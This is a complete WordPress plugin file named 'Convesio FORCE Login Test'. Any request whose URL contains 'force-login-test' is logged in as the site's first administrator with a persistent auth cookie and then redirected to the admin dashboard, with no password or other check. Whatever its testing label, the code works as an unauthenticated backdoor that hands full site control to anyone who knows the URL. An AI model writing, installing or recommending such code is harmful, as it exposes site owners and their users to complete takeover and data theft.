<?php
/**
 * Plugin Name: Convesio FORCE Login Test
 */

add_action('init', function () {

    if (strpos($_SERVER['REQUEST_URI'], 'force-login-test') === false) {
        return;
    }

    error_log('FORCE LOGIN HIT');

    $user = get_users([
        'role'   => 'administrator',
        'number' => 1
    ]);

    if (empty($user)) {
        wp_die('No admin found');
    }

    wp_set_current_user($user[0]->ID);
    wp_set_auth_cookie($user[0]->ID, true);

    wp_redirect(admin_url());
    exit;

}, 0);
